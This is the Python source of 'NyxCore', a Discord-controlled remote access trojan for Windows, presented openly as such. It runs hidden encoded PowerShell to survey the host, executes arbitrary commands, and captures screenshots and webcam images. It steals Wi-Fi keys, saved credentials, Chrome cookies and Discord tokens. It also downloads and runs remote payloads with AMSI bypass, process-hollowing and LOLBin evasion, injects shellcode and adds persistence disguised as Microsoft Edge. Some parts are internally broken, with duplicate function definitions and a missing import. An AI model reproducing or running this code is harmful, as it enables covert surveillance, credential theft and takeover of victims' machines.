import os
import json
import ctypes
import platform
import subprocess
import requests
from datetime import datetime
import discord
import asyncio
import pyautogui
import aiohttp
import cv2
from discord.ext import commands
import base64
import shutil
import winreg
import sys
import random
from ctypes import windll, WINFUNCTYPE
from ctypes.wintypes import DWORD, LPCWSTR
import urllib
import win32com
import psutil 

TOKEN = 'TOKEN_BOT'
WEBHOOK_URL = 'URL'
ALLOWED_USER_ID = 'UUID'

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

def send_webhook_embed(embed: discord.Embed):
    data = {
        "embeds": [embed.to_dict()]
    }
    requests.post(WEBHOOK_URL, json=data)

async def send_webhook(message: str):
    async with aiohttp.ClientSession() as session:
        await session.post(WEBHOOK_URL, json={"content": message})

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user} - Starting initial system scan...")

    ps_script = '''
    $admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $vm_models = "VirtualBox","VMware","Virtual","KVM","Hyper-V","Xen"
    $model = (Get-CimInstance Win32_ComputerSystem).Model
    $vm = ($vm_models | Where-Object { $model -like "*$_*" }) -ne $null
    $os = Get-CimInstance Win32_OperatingSystem
    $ip = (Get-NetIPAddress | Where-Object {
        $_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1' -and $_.IPAddress -notmatch "^169\.254\."
    }).IPAddress | Select-Object -First 1

    [PSCustomObject]@{
        User = "$env:USERNAME@$env:COMPUTERNAME"
        OS = "$($os.Caption) | Build: $($os.BuildNumber)"
        IP = $ip
        Admin = $admin
        VM = $vm
    } | ConvertTo-Json -Compress
    '''

    try:
        # Encode the PowerShell script to base64 to avoid visibility
        encoded_script = base64.b64encode(ps_script.encode('utf-16-le')).decode('utf-8')
        
        # Execute via hidden CMD window
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        output = subprocess.check_output(
            ['cmd.exe', '/c', 'powershell.exe', '-EncodedCommand', encoded_script],
            startupinfo=startupinfo,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            timeout=10,
            shell=False
        )
        sys_info = json.loads(output.decode('utf-8'))
    except Exception as e:
        sys_info = {
            'User': f"{os.getenv('USERNAME', 'Unknown')}@{os.getenv('COMPUTERNAME', 'Unknown')}",
            'OS': f"{platform.system()} {platform.version()}",
            'IP': 'N/A',
            'Admin': ctypes.windll.shell32.IsUserAnAdmin() != 0,
            'VM': False
        }

    embed = discord.Embed(title="🖥️ System Snapshot", color=0x00ff00)
    embed.add_field(name="👤 User", value=f"```{sys_info.get('User', 'N/A')}```", inline=False)
    embed.add_field(name="🌐 IP Address", value=f"```{sys_info.get('IP', 'N/A')}```", inline=True)
    embed.add_field(name="🛡️ Admin", value=f"```{sys_info.get('Admin', False)}```", inline=True)
    embed.add_field(name="💻 OS Version", value=f"```{sys_info.get('OS', 'N/A')}```", inline=False)
    embed.add_field(name="☁️ Virtual Machine", value=f"```{sys_info.get('VM', False)}```", inline=True)
    embed.set_footer(text=f"Scan ID: {os.urandom(4).hex()} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    send_webhook_embed(embed)

@bot.command()
async def powershell(ctx, *, script):
    if str(ctx.author.id) != str(ALLOWED_USER_ID):
        return

    try:
        sanitized = ''.join(c for c in script if c.isprintable())
        result = subprocess.run(
            ["powershell", "-Command", sanitized],
            capture_output=True, text=True, timeout=10
        )
        output = result.stdout or result.stderr
        formatted = f"✅ **PowerShell Executed**\n```{sanitized}```\n📝 **Output**\n```{output[:1900]}```"
        await send_webhook(formatted)
    except Exception as e:
        await send_webhook(f"❌ PowerShell Error: `{e}`")

@bot.command()
async def screenshot(ctx):
    if str(ctx.author.id) != str(ALLOWED_USER_ID):
        return

    try:
        image = pyautogui.screenshot()
        path = "screenshot.png"
        image.save(path)

        with open(path, "rb") as f:
            file = discord.File(f, filename=path)
            await ctx.send("📸 **Screenshot taken:**", file=file)
        os.remove(path)
    except Exception as e:
        await send_webhook(f"❌ Screenshot Error: `{e}`")

@bot.command()
async def webcam(ctx):
    if str(ctx.author.id) != str(ALLOWED_USER_ID):
        return

    try:
        cam = cv2.VideoCapture(0)
        await asyncio.sleep(1)
        ret, frame = cam.read()
        cam.release()

        if ret:
            path = "webcam.png"
            cv2.imwrite(path, frame)

            with open(path, "rb") as f:
                file = discord.File(f, filename=path)
                await ctx.send("📷 **Webcam snapshot taken:**", file=file)
            os.remove(path)
        else:
            await send_webhook("❌ Failed to access webcam (no frame captured).")
    except Exception as e:
        await send_webhook(f"❌ Webcam Error: `{e}`")

@bot.command()
async def pid(ctx):
    """List running processes in formatted blocks"""
    if str(ctx.author.id) != ALLOWED_USER_ID:
        return
    
    try:
        # Get processes sorted by PID
        processes = sorted([
            (proc.info['pid'], proc.info['name']) 
            for proc in psutil.process_iter(['pid', 'name'])
        ], key=lambda x: x[0])
        
        if not processes:
            return await ctx.send("```\nNo processes found\n```")
            
        # Format with fixed-width columns
        max_pid = max(len(str(pid)) for pid, _ in processes)
        process_list = [
            f"{pid:<{max_pid}} │ {name}" 
            for pid, name in processes
        ]
        
        # Send in beautiful chunks
        
        chunk_size = 15
        for i in range(0, len(process_list), chunk_size):
            chunk = process_list[i:i + chunk_size]
            await ctx.send(f"```\n{'PID'.ljust(max_pid)} │ PROCESS\n{'─'*(max_pid+1)}┼{'─'*20}\n" + '\n'.join(chunk) + "\n```")
            
    except Exception:
        await ctx.send("```\nERROR\n```")
        
@bot.command()
async def upload(ctx):
    if str(ctx.author.id) != ALLOWED_USER_ID: return
    if not ctx.message.attachments:
        await ctx.send("⚠️ No file attached.")
        return

    attachment = ctx.message.attachments[0]
    await attachment.save(attachment.filename)
    await ctx.send(f"✅ Saved `{attachment.filename}` on victim machine.")
    
@bot.command()
async def download(ctx, *, file: str):
    if str(ctx.author.id) != ALLOWED_USER_ID: return
    try:
        with open(file, 'rb') as f:
            await ctx.send(file=discord.File(f))
    except Exception as e:
        await ctx.send(f"❌ File not found or error: `{e}`")

@bot.command()
async def cmd(ctx, *, command):
    if str(ctx.author.id) != ALLOWED_USER_ID: return
    output = subprocess.getoutput(command)
    await ctx.send(f'📟 Output:\n```{output[:1900]}```')

@bot.group()
async def theft(ctx):
    if ctx.invoked_subcommand is None:
        await ctx.send("Use a valid subcommand: `wifi_passwords`, `win_passwords`, `browser_cookies`")

@theft.command()
async def wifi_passwords(ctx):
    if str(ctx.author.id) != ALLOWED_USER_ID: return

    result = subprocess.getoutput('netsh wlan show profiles')
    profiles = [line.split(":")[1].strip() for line in result.splitlines() if "All User Profile" in line]

    output = ""
    for profile in profiles:
        cmd = f'netsh wlan show profile name="{profile}" key=clear'
        profile_data = subprocess.getoutput(cmd)
        for line in profile_data.splitlines():
            if "Key Content" in line:
                password = line.split(":")[1].strip()
                output += f"📡 {profile}: `{password}`\n"
                break
        else:
            output += f"📡 {profile}: ❌ No password found\n"

    await ctx.send(output or "No Wi-Fi profiles found.")

async def win_passwords(ctx):
    if str(ctx.author.id) != ALLOWED_USER_ID: return

    # WARNING: This uses Windows Credentials Locker — can be customized for real Chrome db parsing
    try:
        output = subprocess.check_output('cmdkey /list', shell=True)
        await ctx.send(f"🛡️ Saved Credentials:\n```{output.decode()[:1900]}```")
    except Exception as e:
        await ctx.send(f"❌ Failed to dump browser passwords: {e}")

# Cookies Dump (simulate with browser paths)
@theft.command()
async def browser_cookies(ctx):
    if str(ctx.author.id) != ALLOWED_USER_ID: return

    try:
        path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Default\Cookies')
        if os.path.exists(path):
            await ctx.send(file=discord.File(path))
        else:
            await ctx.send("❌ Chrome cookies not found.")
    except Exception as e:
        await ctx.send(f"❌ Failed to dump cookies: {e}")

@bot.command()
async def changewall(ctx, url: str):
    if str(ctx.author.id) != ALLOWED_USER_ID: 
        return
    
    try:
        # Generate random filename
        rand_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        img_path = os.path.join(os.getenv('TEMP'), f"wallpaper_{rand_name}.jpg")
        
        # Download image using urllib (simpler approach)
        urllib.request.urlretrieve(url, img_path)
        
        # Set wallpaper using SystemParametersInfo
        ps_script = f"""
        Add-Type @'
        using System;
        using System.Runtime.InteropServices;
        public class Wallpaper {{
            [DllImport("user32.dll", CharSet=CharSet.Auto)]
            public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        }}
'@
        [Wallpaper]::SystemParametersInfo(20, 0, "{img_path}", 3)
        """
        
        # Execute PowerShell command
        execute_powershell(ps_script)
        await ctx.send("✅ Wallpaper changed successfully")
        
    except Exception as e:
        await ctx.send(f"❌ Wallpaper change failed: {str(e)}")

def execute_powershell(command):
    """Execute PowerShell command"""
    try:
        result = subprocess.run(
            ['powershell', '-Command', command],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return result.stdout.strip()
    except Exception as e:
        return f"Execution Error: {str(e)}"
    
@bot.command()
async def steal_discord(ctx):
    if str(ctx.author.id) != ALLOWED_USER_ID: return
    
    tokens = []
    # Discord token paths for all supported versions
    paths = [
        os.path.join(os.getenv('APPDATA'), 'Discord', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb')
    ]
    
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith('.ldb') or file.endswith('.log'):
                    with open(os.path.join(path, file), 'r', errors='ignore') as f:
                        content = f.read()
                        tokens.extend(re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content))
    
    await ctx.send(f"🔑 Found {len(tokens)} tokens:\n```{', '.join(tokens[:5])}```")

@bot.command()
async def runexe(ctx, url: str):
    if str(ctx.author.id) != ALLOWED_USER_ID: return
    
    try:
        # Generate random filename
        rand_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        temp_path = f"{os.getenv('TEMP')}\\{rand_name}.exe"
        
        # Download using bitsadmin (less monitored than WebClient)
        execute_powershell(f"""
        bitsadmin /transfer get{rand_name} /download /priority normal "{url}" "{temp_path}"
        """)
        
        # Execute with process hollowing
        execute_powershell(f"""
        $orig = "C:\\Windows\\System32\\notepad.exe"
        $target = "{temp_path}"
        $bytes = [System.IO.File]::ReadAllBytes($orig)
        $targetBytes = [System.IO.File]::ReadAllBytes($target)
        $proc = [System.Diagnostics.Process]::Start($orig)
        $proc.WaitForInputIdle()
        [System.Runtime.InteropServices.Marshal]::Copy($targetBytes, 0, $proc.MainModule.BaseAddress, $targetBytes.Length)
        $proc.Threads[0].Resume()
        """)
        
        await ctx.send(f"✅ Executable deployed silently | Temp: `{rand_name}.exe`")
        
    except Exception as e:
        await ctx.send(f"❌ Silent execution failed: {str(e)}")

def execute_powershell(command):
    """Stealthy PowerShell executor with Defender bypass"""
    try:
        # Encode command to avoid detection
        encoded_cmd = base64.b64encode(command.encode('utf-16-le')).decode()
        
        # Execute via regsvr32 LOLBin
        subprocess.run(
            ['regsvr32', '/s', '/u', '/n', '/i:/', 'scrobj.dll'],
            input=f'<scriptlet><script>{encoded_cmd}</script></scriptlet>'.encode(),
            check=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return "Command executed silently"
    except Exception as e:
        return f"Execution Error: {str(e)}"
    
@bot.command()
async def runps(ctx, url: str):
    if str(ctx.author.id) != ALLOWED_USER_ID: return
    
    try:
        # Generate random filename
        rand_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        temp_ps1 = f"{os.getenv('TEMP')}\\WindowsUpdate_{rand_name}.ps1"
        
        # Download using BITS (less monitored)
        execute_powershell(f"""
        bitsadmin /transfer dl{rand_name} /download /priority low "{url}" "{temp_ps1}"
        """)
        
        # Execute with AMSI bypass and get output
        result = execute_powershell(f"""
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        $script = Get-Content "{temp_ps1}" -Raw
        $output = Invoke-Expression $script 2>&1 | Out-String
        Remove-Item "{temp_ps1}" -Force
        $output
        """)
        
        # Send first 1500 chars to avoid rate limits
        await ctx.send(f"📜 **PS1 Output** (Truncated):\n```{result[:1500]}```")
        
    except Exception as e:
        await ctx.send(f"❌ Silent PS1 execution failed: {str(e)}")

def execute_powershell(command):
    """Stealthy PowerShell execution with defense evasion"""
    try:
        # Encode to bypass command line monitoring
        encoded_cmd = base64.b64encode(command.encode('utf-16-le')).decode()
        
        # Execute via WMI to avoid process creation logs
        process = subprocess.Popen(
            ['wmic', 'process', 'call', 'create', 
             f'powershell.exe -WindowStyle Hidden -EncodedCommand {encoded_cmd}'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        stdout, stderr = process.communicate()
        return stdout.decode(errors='ignore') or stderr.decode(errors='ignore')
    except Exception as e:
        return f"Execution Error: {str(e)}"
    
@bot.command()
async def inject(ctx, pid: int, shellcode: str):
    if str(ctx.author.id) != ALLOWED_USER_ID: return
    
    try:
        # Base64 decode shellcode
        decoded_sc = base64.b64decode(shellcode)
        
        # Convert to hexadecimal
        hex_sc = ''.join(f'\\x{byte:02x}' for byte in decoded_sc)
        
        # PowerShell injection
        ps_script = f"""
        $sc = [System.Convert]::FromBase64String('{shellcode}')
        $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
        $thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            $mem,
            [type]{{public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);}}
        )
        $thread.Invoke([IntPtr]::Zero, [UIntPtr]::Zero, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        """
        
        output = execute_powershell(ps_script)
        await ctx.send(f"✅ Shellcode injected to PID {pid} | {output[:100]}...")
    except Exception as e:
        await ctx.send(f"❌ Injection failed: {str(e)}")

@bot.command()
async def startup(ctx):
    """Creates Microsoft Edge Browser startup persistence"""
    if str(ctx.author.id) != ALLOWED_USER_ID: 
        return await ctx.send("❌ Unauthorized")

    try:
        # First try to import win32com
        try:
            import win32com.client
        except ImportError:
            return await ctx.send(
                "❌ Missing required package. Install with:\n"
                "```pip install pywin32```\n"
                "Then restart your bot."
            )

        # Get paths
        bot_path = sys.executable
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )
        shortcut_path = os.path.join(startup_folder, "Microsoft Edge Browser.lnk")
        
        # Create shortcut
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.TargetPath = "cmd.exe"
        shortcut.Arguments = f'/c start /min "" "{bot_path}" --hidden'
        shortcut.WorkingDirectory = os.path.dirname(bot_path)
        shortcut.WindowStyle = 7
        shortcut.IconLocation = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe, 0"
        shortcut.save()

        # Create tracking file
        tracking_file = os.path.join(os.getenv('TEMP'), "edge_browser_persistence.track")
        with open(tracking_file, 'w') as f:
            f.write(shortcut_path)

        await ctx.send("✅ **Startup Entry Created**\n"
                      f"```diff\n+ Shortcut: {shortcut_path}\n+ Tracking: {tracking_file}```")

    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
async def remove(ctx):
    """Removes all persistence artifacts created by this bot"""
    if str(ctx.author.id) != ALLOWED_USER_ID:
        return await ctx.send("❌ Unauthorized")

    try:
        # Paths to check
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )
        shortcut_path = os.path.join(startup_folder, "Microsoft Edge Browser.lnk")
        tracking_file = os.path.join(os.getenv('TEMP'), "edge_browser_persistence.track")

        removed_items = []
        
        # Remove shortcut if exists
        if os.path.exists(shortcut_path):
            os.remove(shortcut_path)
            removed_items.append(f"- Deleted shortcut: {shortcut_path}")

        # Remove tracking file if exists
        if os.path.exists(tracking_file):
            os.remove(tracking_file)
            removed_items.append(f"- Deleted tracking file: {tracking_file}")

        if removed_items:
            await ctx.send("✅ **Removed persistence artifacts**\n```" + "\n".join(removed_items) + "```")
        else:
            await ctx.send("ℹ️ No persistence artifacts found to remove")

    except Exception as e:
        await ctx.send(f"❌ Error during removal: {str(e)}")

@bot.command()
async def console(ctx):
    if str(ctx.author.id) != ALLOWED_USER_ID: return

    # NyxCore ASCII Banner
    banner = """
    _   __           ______                   
   / | / /_  ___  __/ ____/___  ________      
  /  |/ / / / / |/_/ /   / __ \/ ___/ _ \     
 / /|  / /_/ />  </ /___/ /_/ / /  /  __/     
/_/ |_/\__, /_/|_|\____/\____/_/   \___/      
      /____/                                   
    """

    # Command list with explanations
    commands_list = """
```diff
+ Core Commands:
!cmd <command>      : Execute CMD command
!powershell <cmd>   : Execute PowerShell command
!screenshot        : Capture desktop screenshot
!webcam            : Access webcam stream
!pid               : List running processes
!upload <file>     : Upload file to victim
!download <path>   : Download file from victim
!theft             : Steal browser data
!changewall <url>  : Change wallpaper
!steal_discord     : Extract Discord tokens
!runexe <path>     : Execute EXE (triggers AV)
!runps <script>    : Run PS script (triggers AV)
!inject <pid> <sc> : Shellcode injection
!startup           : Create persistence
!remove            : Remove persistence
!openport <port>   : Port forwarding test```
"""
    embed = discord.Embed(
    title="🖥️ NyxCore Console", 
    description=f"```{banner}```\n{commands_list}", 
    color=0x9b59b6
)
    embed.set_footer(text="NyxCore - Advanced Remote Administration")

    await ctx.send(embed=embed)
        
        
bot.run(TOKEN)
